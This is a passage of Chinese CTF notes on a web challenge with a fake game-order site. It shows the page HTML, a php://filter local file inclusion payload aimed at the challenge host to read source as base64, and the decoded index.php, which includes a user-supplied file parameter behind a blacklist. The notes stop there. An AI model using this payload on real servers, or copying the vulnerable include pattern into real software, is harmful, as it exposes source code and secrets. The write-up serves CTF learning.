---
tags:
  - web
  - SQL
  - CTF
---
![](图片/Pasted%20image%2020241202192235.png)
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>index</title>
<base href="./">
<meta charset="utf-8" />

<link href="assets/css/bootstrap.css" rel="stylesheet">
<link href="assets/css/custom-animations.css" rel="stylesheet">
<link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
    <div class="container">
        <h2>2077发售了,不来份实体典藏版吗?</h2>
        <img class="logo" src="./assets/img/logo-en.png"><!--LOGOLOGOLOGOLOGO-->
        <div class="row">
            <div class="col-md-8 col-md-offset-2 centered">
                <h3>提交订单</h3>
                <form role="form" action="./confirm.php" method="post" enctype="application/x-www-urlencoded">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>地址:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <button class='btn btn-lg  btn-sub btn-white' type="submit">我正是送钱之人</button>
                </form>
            </div>
        </div>
    </div>
</div>
<div id="f">
    <div class="container">
        <div class="row">
            <h2 class="mb">订单管理</h2>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
        </div>
    </div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
<!--?file=?-->
  ```
通过提示用php伪协议`file=php://filter/convert.base64-encode/resource=index.php`
`(http://9d6557bf-a52a-467c-8937-6228320cd03d.node5.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=index.php)`
找到文件index.php,search.php,change.php,delete.php
得到经过base64编码的index.php
![](图片/Pasted%20image%2020241202193038.png)
解码后得到

```php
<?php
#index.php
ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}

```
